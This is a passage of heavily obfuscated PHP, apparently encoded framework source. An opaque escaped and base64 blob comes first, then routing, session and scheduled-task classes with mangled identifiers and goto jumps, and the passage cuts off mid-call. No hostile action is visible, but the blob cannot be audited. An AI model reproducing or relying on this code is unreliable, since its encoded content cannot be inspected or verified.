154\215\4\276\220\217\24\320\0\162\273\224\202\21\115\47\222\217\347\321\204\147\144\220\231\53\267\354\103\166\273\154\76\221\201\57\13\351\302".base64_decode('jqMwLShkLCuSFX6Ji5WjYIb2YukYQjC50aIlZssAVoY1nfjQzFjeAwR4YNFG')."\260\125\102\274\247\212\176\102\121\51\76\16\256\160\7\242\64\354\251\123\0\14\277\214\306\326\301\124\123\220\321\45\36\35\321\130\144\341\205\266\213\151\112\22\173"."\x10\xf2\x5e\x4b\x59\x39\xb4\x7\xb1\x9c\x25\xb4\xe\x30\xbd\x7e\x30\x93\x3d\x70\x7f\x64\x4a\x6c\x86\x18\xa0\xa9\xc\x39\xd\x4b\x0\x6b\x80\x58\x4a\xb3\x28\x96\xab\x4f\x21\xa6\x1d"."\114\6\16\266\4\335\54\252\236\202\211\131\150\22\1\212\277\0\102\124\241\210\155\105\37\200\273\326\107\26\130\103\15\123\212\241\357\13\366\145\324\204\344\17\64"."\373\32\74\376\106\137\170\226\324\255\230\302\343\230\110\271\331\272\334\321\221\20\236\34\212\371\161\346\32\26\176\72\343\200\55\164\46\31\73\154\160\306\127\320\225".base64_decode('EfykW6vFOKroBTUCNjpjJQioDDzoKpI7zc96hMw5XSnMP6CgRwJ5j4UC+SK9').base64_decode('IfmLtwCWiDU32KyV7FCdV7O9qqFy4kBLDIi186M8nTk0FoCeFH0Wc2DjVkTj')."\x7d\xbb\xec\x29\xe6\x10\x55\x20\xf1\x34\x89\x7e\x3b\x72\xf4\x60\x9a\x3c\x7c\xc1\xbd\x49\xa3\xa0\xe0\xe7\x3b\xa7\xcb\xaa\xa1\x8\x11\xd8\xe1\x74\x45\x39\xd\x9\x3e\x3e\x48\xe9\x18"."\x2e\x83\xe3\x42\xf0\xd1\xbc\xff\x75\xe5\x6a\x92\xfb\xeb\xb0\x75\x4d\x4d\xd2\xeb\x6c\xa6\xc1\x8e\xbd\xba\x36\x88\x6f\x77\xd0\x2e\x14\x38\x23\xff\xaf\x6e\xcd\x1d\xfc\x2c\x3e\x86\x4c".base64_decode('waleIXo5lFw0sEvcGDZFx0G3XfcQOVLNJvSBnHg74k7SZ2Oo5Abdj3jp0SgM')."\x8\x8f\x6e\x68\xc9\x44\x5a\xcb\x27\x79\x61\xd2\x18\xec\xd\x16\x60\x80\x38\x5\x2f\xd\x28\xa3\xeb\xa2\xe4\xcf\x94\xc8\xac\x58\xee\xa\x6d\xfe\xdb\xed\xaa\x70\x96\x87\xf4\xa\xda"."\200\216\161\207\256\7\224\223\270\24\317\62\110\265\122\45\72\51\342\112\117\322\164\152\153\303\233\100\56\30\274\231\234\151\221\321\210\112\54\216\102\274\10\227\143"."\240\246\205\226\31\50\210\260\10\370\176\332\15\246\173\5\375\5\147\273\64\161\324\210\34\202\135\5\277\36\1\125\220\361\27\26\2\35\200\55\127\314\102\237\345"."\xb8\x9e\x21\x2b\x35\xec\x1b\xa\x67\x6e\x0\x89\x8\xa7\xb4\x3e\xeb\xeb\x12\x30\x46\x60\x65\x2c\x24\xda\xda\x16\x4c\x11\x50\x1b\x19\x58\xa\xe6\x2a\xf4\x17\x9e\xd7\x5b\x9c\xc5\xb"."\xb5\x8f\xc1\x3f\x51\xf2\x4b\x69\xbe\xbd\x6a\xbc\xca\x49\x57\xca\xd9\x54\x37\x58\xde\xf1\x15\x22\x5a\x15\x2e\x97\xa1\x52\xf0\xda\x5b\xce\x32\x22\x46\xbc\xb5\xb3\x57\x24\xf8\x62\xa3"."\151\2\6\241\367\12\32\207\50\152\213\226\254\356\243\271\127\156\276\37\131\75\51\263\213\56\246\4\205\224\321\104\277\330\21\55\42\167\73\60\47\4\351\21\17"."\325\17\210\337\242\226\37\32\64\110\244\47\44\111\206\1\63\204\14\364\301\207\244\3\275\106\200\251\222\375\305\13\141\271\60\122\47\226\356\116\153\161\71\35\302"."\332\63\26\355\163\35\110\61\114\67\316\222\215\20\52\71\227\33\362\60\236\160\47\370\140\76\237\365\141\373\45\113\254\56\110\111\242\236\45\276\202\340\246\33\44"."\73\150\55\210\357\34\310\260\305\52\351\275\17\372\201\162\124\223\360\172\234\273\360\236\10\152\367\120\146\107\120\203\43\327\167\56\121\214\41\31\244\351\22\237\140".base64_decode('ywKFCAFXPfpAq15ke38iluGh9U0UjLDop1HpYjIADHMJUTTg5HfF9ncYaDPs')."\121\11\7\36\31\177\327\7\77\41\341\140\317\105\70\360\113\21\16\362\110\204\203\233\340\374\324\263\52\374\121\50\353\113\122\260\317\114\157\254\200\31\267\363\341"."\14\124\266\2\41\73\340\42\132\341\271\32\277\35\313\346\63\374\102\22\4\254\162\111\301\200\205\21\346\365\264\3\335\15\72\250\277\22\33\70\370\250\304\231\51"."\x2\xc3\xff\x5e\x7\x56\x1f\x44\xc2\x46\xd2\x4a\x75\x6a\xa6\xc7\x75\x7a\xdf\x62\xcf\xa6\x5a\xb0\xe\x88\xf8\x5c\x5b\x1d\xbb\x6d\x2a\xf0\x4d\x3f\x2f\x93\xac\x1e\x3f\x71\xaa\x28\xd4"."\363\371\341\367\30\304\117\34\161\237\105\56\123\310\6\316\47\136\262\242\225\104\135\106\211\313\27\45\132\25\74\13\37\165\21\120\324\112\222\377\167\113\201\263\310".strrev('ø_q‘Qü-µ‹¨ş0·‹;Á°åàÖ…»f†Â'."\n".'J'."\n".'VHUbøYx «8').strrev('âÀ‰Ÿ³SF±¤O±È`ß{Ï\'¢¢$¨$5*Ùu4ê<Í…'."\r".'-½')."\160\243\102\107\162\201\154\232\154\273\320\326\220\57\262\377\333\4\122\1\1\313\30\134\37\241\310\310\335\147\121\102\142\173\157\305\366\140\326\117\364\33\63\135\114"."\30\162\312\364\15\27\64\251\302\71\232\142\6\320\4\23\356\205\313\146\326\261\332\252\7\305\170\35\235\16\151\250\114\205\134\230\360\276\14\167\276\40\260\134\260".base64_decode('NDVzGkK0pdSKv5mBLFf40TRaq5Z1K7hkEw1BUEXiMiisGp2WkP6ShYueIEeK').strrev('šshüt[[ûV{hÜ ]ˆ²I€VP'."\r".'œµmøšI›Ât"ê#îff')._kodDe('MsQSRXlrpKTiMXAcBpvY7Jg2YjDgbvOv+NK1lDW+CrGwJZkb2NGZD/DHRXhfrg==')."\301\245\365\241\305\224\330\55\350\46\300\266\254\251\341\36\264\203\304\267\51\204\360\43\7\141\370\233\162\342\377\317\57\257\375\377\174\160\215\51\203\67\23\266\226".base64_decode('8mCDgkNNfKhp6711YzxCTCV46bCESIAvM7jjuGwvTbqYQiJ1JkF9TMj00kSG')."\xaf\xcb\x14\x1c\x52\xd2\x57\x99\x0\x1e\xf6\xb0\x47\x83\x8a\x5\xa\x9f\xcc\xb3\xa0\x1c\xe5\x32\x79\x37\xb3\x6a\xa2\xa7\xc8\x25\x1c\x4\xbc\xdf\xea\xc3\x4f\xe0\xd\xa\xb2\x71\xaa"."\4\130\10\352\76\303\115\277\22\120\270\202\14\44\45\206\242\161\130\40\107\305\260\162\102\177\73\317\242\104\3\131\230\22\332\41\322\13\113\124\1\225\211\130\366"."\76\113\244\10\36\376\64\244\313\372\322\41\51\321\152\173\23\7\147\262\70\170\264\234\50\43\325\136\253\277\300\134\336\356\57\20\113\30\142\35\342\45\156\141\163".strrev('C<ó'."\r".'êğe"Ä[ Rİ1@0x!Ç†¨VØYÊ¯ iWÇ½‡ õ§F E‹Íl')."\254\227\342\153\225\275\246\50\310\313\340\113\34\57\135\363\101\135\103\260\263\306\262\303\17\101\201\116\170\34\256\340\301\52\333\151\77\220\242\370\365\227\252\41\347"."\235\144\330\341\366\326\62\144\23\100\120\33\10\1\302\43\254\146\46\207\217\310\110\247\261\321\215\345\100\312\20\375\361\132\155\163\4\145\127\153\2\324\116\266\56".strrev('£Ui8.Å\\%£]É…‘l±˜’*“İª£Üš¦`›áybø±²İ4%²Å­')."\104\211\50\232\372\160\242\57\363\362\313\44\353\135\36\163\36\131\100\332\362\252\137\110\106\245\250\27\20\360\13\115\220\174\334\340\32\45\343\43\160\117\257\154\322"."\x1b\x31\x7b\xa9\x76\x8b\xc8\x21\xdc\xfc\x25\x10\xee\x78\xb\x2f\x77\xf8\x9d\x93\xc0\x23\xd0\x62\x50\x66\xe1\xc4\xd9\x16\x2f\xec\x16\x9c\x3c\xca\xbd\xfc\x3e\x87\x33\xc9\xc9\x24\x7b"."\346\321\222\225\75\363\316\142\101\14\177\21\22\262\104\202\125\43\127\237\125\372\354\57\217\271\104\113\110\113\306\302\130\156\365\150\37\27\132\13\252\110\337\134\242"."\xb9\x24\xc3\x16\x1e\x85\xbd\xe6\x32\x35\x15\x41\xd2\x80\xfa\xdd\x5c\x7f\x5\xf7\x91\xc9\xd1\xbc\x49\xab\x71\x26\xcb\xc6\x26\x3\xe4\x41\xda\xf4\x4e\x4b\xac\x4d\x76\x82\xa7\x12\x74"."\x43\xb7\x25\x19\xe2\xd3\x94\xd6\x9b\x3a\x51\xb0\x17\xe6\x56\x49\xfb\x85\xea\xc4\x5b\xbc\x21\xb\x84\x8b\x37\xc2\xd1\xcd\xa\x62\xc1\x90\x95\x27\xd0\x6d\x4b\xb3\x0\x5f\xa0\x62\x6c".base64_decode('YCRnSEy0dMc+tYjt53iJIzPo4NNFD5IL8yu23osF7CPDJYw+1UykCuP1AriR')."\xba\x8a\x77\xc9\xde\x30\x5\x9b\x5d\x8\xe3\x95\x8\xe2\x4f\xc1\x6d\x7f\x44\x2b\x52\x6\xf7\xa8\x68\x31\x9c\x84\xde\x48\x66\xc\xa3\xa5\x2c\x1e\x65\xd1\xb2\x38\x9\x96\x2d\x48\xa6"."\x85\x85\xd3\xb\xa1\x9c\x29\xe7\x8d\x21\x86\x57\x8\x3c\x22\xc8\x27\x8b\xc\xd8\x26\xee\xe2\xac\x43\xc1\xb3\x68\xe6\xc2\xe6\x8\x52\xd9\x73\x23\xc9\xbf\x78\x2f\xb8\xc0\x6e\xbb\x51"."\x2d\xd6\x8b\xa2\x99\x87\xec\x45\x91\x77\x5f\x89\x33\xab\x22\x74\x92\xa6\x14\xa1\x8c\xfc\xfa\xbd\x90\x6\xf3\xb4\x22\xca\x0\xb8\x4e\xb8\xbf\x8a\x1e\x55\x8a\x24\x8b\x9a\x5\xc5\x75"."\xf\x42\x45\x57\xb7\x61\x55\xa\xb0\xc5\x8b\x80\xe1\x3a\x45\x44\xcb\xa8\x27\x4b\x2d\x33\x40\x71\xae\xa7\x5\xd5\x30\xd9\x83\xa0\xac\x3e\xca\x5d\xd9\x94\x5a\x29\xee\x65\xf3\x82\x7e".base64_decode('ZVGtWAd6LrpAGk3L9LRbUCjGMohmqglB88j+QDZOp42khUM02/kVl9gtN85F')."\116\170\120\24\341\245\370\301\261\105\323\32\157\316\344\304\34\137\234\65\300\133\124\166\131\2\205\45\7\336\363\160\62\174\261\333\1\323\42\132\16\375\326\153\246"."\x49\x49\x5\x90\xe1\x51\x4e\xc4\x81\xc1\x8d\xcb\x21\x68\x1d\x80\x2f\x7e\x33\x2\xa1\x88\xe\xeb\x11\xbe\x21\xba\x80\x3e\xc9\x15\x1e\x14\x1f\xc3\xa\x4e\x45\xd4\xc4\x12\x80\x97\x0"."\54\40\356\113\344\336\255\51\157\273\74\344\21\100\44\214\153\375\324\23\31\264\336\344\375\341\357\210\312\166\56\213\337\375\23\174\23\165\50\220\215\254\341\306\51".base64_decode('buLO1YnqcBI3IItz3Zbi2J890x38qRrI+SKvArt5REdD0OGpd64vHAkXJAU9')."\341\160\107\40\324\210\275\102\26\44\243\122\202\272\112\101\122\260\45\320\66\124\232\267\325\343\363\27\244\101\365\225\266\30\167\136\203\223\174\101\324\113\217\337\37"."\350\30\252\27\276\206\131\274\47\350\172\224\37\140\347\122\32\75\215\246\347\374\141\71\115\45\143\301\360\113\311\160\57\106\274\214\125\340\27\347\325\240\356\274\330"."\x87\xd5\x77\xba\x4d\x93\x8c\x22\x2c\xa9\x8\xaa\x9e\xb4\x91\xba\x43\x39\x12\xb\xbd\x64\xb2\xc5\xcd\x38\x59\x34\x20\xcd\xa6\xe1\x8e\x2f\x80\x5d\x96\x5b\x63\x21\x1e\x2d\x16\xe1\x45".base64_decode('eszqC9sniqgoCjHxDLTwTB6lcojAns7UiLLTYi0unLljwYJYYBEYC/pG+Jsk')."\xff\xf\x51\x9a\x88\xf0\xbb\x9a\x0\x0".""."", 10, -8))); goto C“×”“ï—©; aƒ®‚¦Ñîå: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\133\x5e\57\135\53", "\72\x6e\x75\155" => "\133\x30\55\71\135\x2b", "\x3a\x61\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($AÔâó®äø…, $EŸ´ˆ‘Ö…) { $CÌÖ£ôİ =& $_SERVER[ç]; if ($AÔâó®äø… == $CÌÖ£ôİ[1439]) { $cëø£ÂŸ = array_map($CÌÖ£ôİ[1440], $EŸ´ˆ‘Ö…[0]); $FÍ‹§Ş‘› = strpos($EŸ´ˆ‘Ö…[1], $CÌÖ£ôİ[8]) === 0 ? $EŸ´ˆ‘Ö…[1] : $CÌÖ£ôİ[8] . $EŸ´ˆ‘Ö…[1]; $EÓ½ºĞÇ¢Õ = $EŸ´ˆ‘Ö…[2]; } else { $cëø£ÂŸ = null; $FÍ‹§Ş‘› = strpos($EŸ´ˆ‘Ö…[0], $CÌÖ£ôİ[8]) === 0 ? $EŸ´ˆ‘Ö…[0] : $CÌÖ£ôİ[8] . $EŸ´ˆ‘Ö…[0]; $EÓ½ºĞÇ¢Õ = $EŸ´ˆ‘Ö…[1]; } array_push(self::$maps, $cëø£ÂŸ); array_push(self::$routes, $FÍ‹§Ş‘›); array_push(self::$methods, strtoupper($AÔâó®äø…)); array_push(self::$callbacks, $EÓ½ºĞÇ¢Õ); } public static function error($fƒß Ôé’) { self::$errorCallback = $fƒß Ôé’; } public static function haltOnMatch($dÅí¬äÓµŞ = true) { self::$halts = $dÅí¬äÓµŞ; } public static function dispatch() { goto F¸Œ ¥²§í; BŸÊ©ôøùˆ: self::$routes = preg_replace($C±µµŸ›Ùğ[1129], $C±µµŸ›Ùğ[8], self::$routes); if (in_array($FŠ¹Ë, self::$routes)) { $B–Èª÷–æ¦ = array_keys(self::$routes, $FŠ¹Ë); foreach ($B–Èª÷–æ¦ as $EÍßÇ±ˆªì) { if (self::$methods[$EÍßÇ±ˆªì] == $c÷˜²”˜¦ñ || self::$methods[$EÍßÇ±ˆªì] == $C±µµŸ›Ùğ[1442] || in_array($c÷˜²”˜¦ñ, self::$maps[$EÍßÇ±ˆªì])) { $FˆÎàªÃÍ² = !0; if (!is_object(self::$callbacks[$EÍßÇ±ˆªì])) { $aó”²Îò‚ = explode($C±µµŸ›Ùğ[8], self::$callbacks[$EÍßÇ±ˆªì]); $e«’¯Ïå£á = end($aó”²Îò‚); $aùá©„Ü• = explode($C±µµŸ›Ùğ[1443], $e«’¯Ïå£á); $EöĞë¯ù˜Æ = new $aùá©„Ü•[0](); $EöĞë¯ù˜Æ->{$aùá©„Ü•[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$EÍßÇ±ˆªì]); if (self::$halts) { return; } } } } } else { $Eçµ“ŞÕ¹ = 0; foreach (self::$routes as $EÍßÇ±ˆªì) { if (strpos($EÍßÇ±ˆªì, $C±µµŸ›Ùğ[4]) !== !1) { $EÍßÇ±ˆªì = str_replace($cŒ–¸æâÄ÷, $F±‚‡óˆÌÂ, $EÍßÇ±ˆªì); } if (preg_match($C±µµŸ›Ùğ[1444] . $EÍßÇ±ˆªì . $C±µµŸ›Ùğ[1445], $FŠ¹Ë, $f‘¡Ÿ—¥Æ)) { if (self::$methods[$Eçµ“ŞÕ¹] == $c÷˜²”˜¦ñ || self::$methods[$Eçµ“ŞÕ¹] == $C±µµŸ›Ùğ[1442] || !empty(self::$maps[$Eçµ“ŞÕ¹]) && in_array($c÷˜²”˜¦ñ, self::$maps[$Eçµ“ŞÕ¹])) { $FˆÎàªÃÍ² = !0; array_shift($f‘¡Ÿ—¥Æ); if (!is_object(self::$callbacks[$Eçµ“ŞÕ¹])) { $aó”²Îò‚ = explode($C±µµŸ›Ùğ[8], self::$callbacks[$Eçµ“ŞÕ¹]); $e«’¯Ïå£á = end($aó”²Îò‚); $aùá©„Ü• = explode($C±µµŸ›Ùğ[1443], $e«’¯Ïå£á); $EöĞë¯ù˜Æ = new $aùá©„Ü•[0](); if (!method_exists($EöĞë¯ù˜Æ, $aùá©„Ü•[1])) { echo $C±µµŸ›Ùğ[1446]; } else { call_user_func_array(array($EöĞë¯ù˜Æ, $aùá©„Ü•[1]), $f‘¡Ÿ—¥Æ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Eçµ“ŞÕ¹], $f‘¡Ÿ—¥Æ); if (self::$halts) { return; } } } } $Eçµ“ŞÕ¹++; } } if ($FˆÎàªÃÍ² == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $BÅŠàŒíæ =& $_SERVER[ç]; header($_SERVER[$BÅŠàŒíæ[1447]] . $BÅŠàŒíæ[1448]); echo $BÅŠàŒíæ[1449]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$C±µµŸ›Ùğ[1441]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto F±­Ê¥ô; AÈÁó‘æå‚: $cŒ–¸æâÄ÷ = array_keys(static::$patterns); $F±‚‡óˆÌÂ = array_values(static::$patterns); $FˆÎàªÃÍ² = !1; goto BŸÊ©ôøùˆ; F¸Œ ¥²§í: $C±µµŸ›Ùğ =& $_SERVER[ç]; $FŠ¹Ë = parse_url($_SERVER[$C±µµŸ›Ùğ[1441]], PHP_URL_PATH); $c÷˜²”˜¦ñ = $_SERVER[$C±µµŸ›Ùğ[156]]; goto AÈÁó‘æå‚; F±­Ê¥ô: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto c¥¹•¥ŒËÁ; c¥¹•¥ŒËÁ: $d©Äê”Ÿ„ç =& $_SERVER[ç]; static $Då¡—±Á¶¹ = false; if ($Då¡—±Á¶¹) { return $Då¡—±Á¶¹; } goto dö“²Ùç’¼; dö“²Ùç’¼: $A¦Ş¡Á«Ä· = $GLOBALS[$d©Äê”Ÿ„ç[6]][$d©Äê”Ÿ„ç[345]]; self::$sessionTime = $A¦Ş¡Á«Ä·[$d©Äê”Ÿ„ç[1450]]; $Bë„ÄÜÍÛÅ = isset($GLOBALS[$d©Äê”Ÿ„ç[1451]]) ? $GLOBALS[$d©Äê”Ÿ„ç[1451]] : SESSION_ID; goto BÒ¬‘§Õíİ; BÒ¬‘§Õíİ: if (self::$sessionSign) { } else { if (Cookie::get($Bë„ÄÜÍÛÅ)) { self::$sessionSign = Cookie::get($Bë„ÄÜÍÛÅ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Bë„ÄÜÍÛÅ, self::$sessionSign, self::$sessionTime); $d„ºö•…Á = $A¦Ş¡Á«Ä·[$d©Äê”Ÿ„ç[1452]]; goto DÏÅ££ÚœÅ; AÒßæ¿Åõ£: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $Då¡—±Á¶¹ = new self(); return $Då¡—±Á¶¹; goto cêİŒ²ôÛ³; DÏÅ££ÚœÅ: $C¶½Ø‰ïÌ = $A¦Ş¡Á«Ä·[$d„ºö•…Á]; $Bİš¬ŠÜì = $A¦Ş¡Á«Ä·[$d©Äê”Ÿ„ç[763]]; switch ($d„ºö•…Á) { case $d©Äê”Ÿ„ç[17]: self::$handle = Model($d©Äê”Ÿ„ç[764]); break; case $d©Äê”Ÿ„ç[765]: self::$handle = new CacheRedis($C¶½Ø‰ïÌ, $Bİš¬ŠÜì); break; case $d©Äê”Ÿ„ç[766]: self::$handle = new CacheMemcached($C¶½Ø‰ïÌ, $Bİš¬ŠÜì); break; case $d©Äê”Ÿ„ç[173]: $C¶½Ø‰ïÌ[$d©Äê”Ÿ„ç[75]] = $C¶½Ø‰ïÌ[$d©Äê”Ÿ„ç[75]] . $d©Äê”Ÿ„ç[1453]; self::$handle = new CacheFile($C¶½Ø‰ïÌ, $Bİš¬ŠÜì); default: break; } goto AÒßæ¿Åõ£; cêİŒ²ôÛ³: } public static function sign($FºâáÊÍ = false) { $FºâáÊÍ && (self::$sessionSign = $FºâáÊÍ); self::init(); return self::$sessionSign; } public static function set($B›¹àÏš´, $e ãÆèëİ = false) { self::init(); if (is_array($B›¹àÏš´)) { foreach ($B›¹àÏš´ as $e–šîµª½¼ => $EëÈº·Á‘) { array_set_value(self::$data, $e–šîµª½¼, $EëÈº·Á‘); } } else { array_set_value(self::$data, $B›¹àÏš´, $e ãÆèëİ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($fˆÙáäâ Ê = false) { self::init(); if (!$fˆÙáäâ Ê) { return self::$data; } return array_get_value(self::$data, $fˆÙáäâ Ê); } public static function remove($b–³‰‚¢­¦) { self::init(); unset(self::$data[$b–³‰‚¢­¦]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ç][768])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto eÅİæÊÜ§Š; fÅÅŸÃù¼: http_close(); self::valueSet($Ağ‚‡¢‘Ñ›[1454], $Ağ‚‡¢‘Ñ›[86]); Hook::bind($Ağ‚‡¢‘Ñ›[1456], $Ağ‚‡¢‘Ñ›[1457]); goto fº¶ÍÄãÖŒ; fº¶ÍÄãÖŒ: while (!0) { self::cacheClear(); if (self::valueGet($Ağ‚‡¢‘Ñ›[695]) != $Ağ‚‡¢‘Ñ›[86]) { self::valueSet($Ağ‚‡¢‘Ñ›[1454], $Ağ‚‡¢‘Ñ›[491]); self::log($Ağ‚‡¢‘Ñ›[1458]); die; } self::valueSet($Ağ‚‡¢‘Ñ›[1454], $Ağ‚‡¢‘Ñ›[86]); self::valueSet($Ağ‚‡¢‘Ñ›[1455], time()); self::taskRunAll(); sleep(self::valueGet($Ağ‚‡¢‘Ñ›[1459])); } goto a·‚¶±¿òˆ; eÅİæÊÜ§Š: $Ağ‚‡¢‘Ñ› =& $_SERVER[ç]; if (self::valueGet($Ağ‚‡¢‘Ñ›[695]) != $Ağ‚‡¢‘Ñ›[86]) { return; } if (self::valueGet($Ağ‚‡¢‘Ñ›[1454]) == $Ağ‚‡¢‘Ñ›[86]) { $e¶‡¢õæÉ¬ = self::valueGet($Ağ‚‡¢‘Ñ›[1455]); if (time() - $e¶‡¢õæÉ¬ > 3600 * 2) { self::restart(); } return; } goto fÅÅŸÃù¼; a·‚¶±¿òˆ: } public static function restart() { $aÈ”Ïö¯ì® =& $_SERVER[ç]; http_close(); self::valueSet($aÈ”Ïö¯ì®[695], $aÈ”Ïö¯ì®[491]); sleep(self::valueGet($aÈ”Ïö¯ì®[1459]) + 5); self::valueSet($aÈ”Ïö¯ì®[1454], $aÈ”Ïö¯ì®[491]); self::valueSet($aÈ”Ïö¯ì®[695], $aÈ”Ïö¯ì®[86]); } public static function shutdownEvent() { $CóÈ¢˜èçÖ =& $_SERVER[ç]; self::valueSet($CóÈ¢˜èçÖ[1454], $CóÈ¢˜èçÖ[491]); self::log($CóÈ¢˜èçÖ[1460]); } public static function config($AË™ãæéöŠ, $a†ò’Ğ‘“Š) { $D–“°†òµ =& $_SERVER[ç]; $Eƒ¨ºÂÅµ = 10; $a†ò’Ğ‘“Š = intval($a†ò’Ğ‘“Š) <= $Eƒ¨ºÂÅµ ? $Eƒ¨ºÂÅµ : intval($a†ò’Ğ‘“Š); self::valueSet($D–“°†òµ[695], $AË™ãæéöŠ); self::valueSet($D–“°†òµ[1459], $a†ò’Ğ‘“Š); } private static function taskRunAll() { goto eåÏ­¡——; CÚ¬‘¯ÒÒ¿: self::taskQueueRun($d²îë¸â†Ò); self::closeDatabase(); goto f‡ÈÑêŒ…¶; f²œÕÁŸÇ: $fÖ†¬ëƒ‹ë = count($Cßè¤‚¾˜ã); for ($bº–»ØÏ…í = 0; $bº–»ØÏ…í < $fÖ†¬ëƒ‹ë; $bº–»ØÏ…í++) { $D§ùƒ´µ»à = $Cßè¤‚¾˜ã[$bº–»ØÏ…í]; if (!$D§ùƒ´µ»à[$dí‰Ìâ¯Æ¥[388]] || $D§ùƒ´µ»à[$dí‰Ìâ¯Æ¥[1462]] != $dí‰Ìâ¯Æ¥[86]) { continue; } if (!self::taskTimeCheck($D§ùƒ´µ»à)) { continue; } self::taskRun($D§ùƒ´µ»à); } Hook::trigger($dí‰Ìâ¯Æ¥[1463]); goto CÚ¬‘¯ÒÒ¿; eåÏ­¡——: $dí‰Ìâ¯Æ¥ =& $_SERVER[ç]; $d²îë¸â†Ò = timeFloat(); $Cßè¤‚¾˜ã = Model($dí‰Ìâ¯Æ¥[1461])->listData(); goto f²œÕÁŸÇ; f‡ÈÑêŒ…¶: } private static function taskQueueRun($DôÊ¾Ó†) { $c°ô½«µ‘Ñ = 10; while (!0) { $BŸ¦Ñ‡ÅŸ² = TaskQueue::run(); if ($BŸ¦Ñ‡ÅŸ² === !1) { break; } if (timeFloat() - $DôÊ¾Ó† >= $c°ô½«µ‘Ñ) { break; } } } private static function taskTimeCheck($dØ‹ÎÜ¢µÂ) { goto a‹‘•ÏËŒË; a‹‘•ÏËŒË: $aÑ‘ÎÈá£á =& $_SERVER[ç]; $CÆ¾š»Û‹£ = json_decode($dØ‹ÎÜ¢µÂ[$aÑ‘ÎÈá£á[195]], !0); $FâŠÄ•âõ = intval($dØ‹ÎÜ¢µÂ[$aÑ‘ÎÈá£á[1455]]); goto E¶¾ö«‘õÜ; E¶¾ö«‘õÜ: $d¾Ç§Ö•µ = strtotime($aÑ‘ÎÈá£á[1464] . $CÆ¾š»Û‹£[$aÑ‘ÎÈá£á[1465]] . $aÑ‘ÎÈá£á[1466]) - strtotime($aÑ‘ÎÈá£á[1467]); $bôµËĞÍÕ = time() - strtotime(date($aÑ‘ÎÈá£á[1468]) . $aÑ‘ÎÈá£á[1469]); $D­½ŒŠÕÄ = $bôµËĞÍÕ >= $d¾Ç§Ö•µ && $bôµËĞÍÕ <= $d¾Ç§Ö•µ + 3600; goto Cè¿ËóŒ; Cè¿ËóŒ: switch ($CÆ¾š»Û‹£[$aÑ‘ÎÈá£á[29]]) { case $aÑ‘ÎÈá£á[1470]: if (time() - $FâŠÄ•âõ < 3600 * 24 * 30) { return !1; } if ($CÆ¾š»Û‹£[$aÑ‘ÎÈá£á[1470]] == date($aÑ‘ÎÈá£á[1471]) && $D­½ŒŠÕÄ) { return !0; } break; case $aÑ‘ÎÈá£á[1472]: if (time() - $FâŠÄ•âõ < 3600 * 24 * 7) { return !1; } $A¥îÈœ£Ü¢ = date($aÑ‘ÎÈá£á[1473]) == 0 ? 7 : date($aÑ‘ÎÈá£á[1473]); if ($CÆ¾š»Û‹£[$aÑ‘ÎÈá£á[1472]] == $A¥îÈœ£Ü¢ && $D­½ŒŠÕÄ) { return !0; } break; case $aÑ‘ÎÈá£á[1465]: if (time() - $FâŠÄ•âõ < 3600 * 24) { return !1; } if ($D­½ŒŠÕÄ) { return !0; } break; case $aÑ‘ÎÈá£á[1474]: if (time() - $FâŠÄ•âõ >= floatval($CÆ¾š»Û‹£[$aÑ‘ÎÈá£á[1474]]) * 60) { return !0; } break; default: break; } return !1; goto Bƒ—”ÉãÌÃ; Bƒ—”ÉãÌÃ: } private static function closeDatabase() { goto b¡ÚÖÖôè; b¡ÚÖÖôè: $DŸ –ÅÚÂ– =& $_SERVER[ç]; static $aù•ˆ×¢•² = 0; $dàç¹«Ãà× = 1800; goto C°“ß”ùâÄ; AÉ²È¿ÅĞã: $C£ÂƒÌæØí = Model($DŸ –ÅÚÂ–[497])->db($DŸ –ÅÚÂ–[33]); if ($C£ÂƒÌæØí) { $C£ÂƒÌæØí->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($DŸ –ÅÚÂ–[1475], $DŸ –ÅÚÂ–[1476]); die; } goto cÙ©¨ÔÜÛ; C°“ß”ùâÄ: if (!$aù•ˆ×¢•²) { $aù•ˆ×¢•² = time(); } if (time() - $aù•ˆ×¢•² < $dàç¹«Ãà×) { return; } $aù•ˆ×¢•² = time(); goto AÉ²È¿ÅĞã; cÙ©¨ÔÜÛ: } public static function taskRun($cÈÃ°Š©Å) { goto c©ŠÊ¥†›’; c©ŠÊ¥†›’: $A‰éÄ¿˜¶ =& $_SERVER[ç]; self::log($A‰éÄ¿˜¶[1477] . $cÈÃ°Š©Å[$A‰éÄ¿˜¶[388]] . $A‰éÄ¿˜¶[1478] . $cÈÃ°Š©Å[$A‰éÄ¿˜¶[28]] . $A‰éÄ¿˜¶[1479] . $cÈÃ°Š©Å[$A‰éÄ¿˜¶[1480]]); Model($A‰éÄ¿˜¶[1461])->run($cÈÃ°Š©Å[$A‰éÄ¿˜¶[388]]); goto f×É”¸‰Ü¾; f×É”¸‰Ü¾: $EñÈÄÖÛÛè = timeFloat(); $Cù¼ËšÜİš = $A‰éÄ¿˜¶[33]; switch ($cÈÃ°Š©Å[$A‰éÄ¿˜¶[29]]) { case $A‰éÄ¿˜¶[303]: $dë‘²Šä‘Ä = url_request($cÈÃ°Š©Å[$A‰éÄ¿˜¶[1480]], 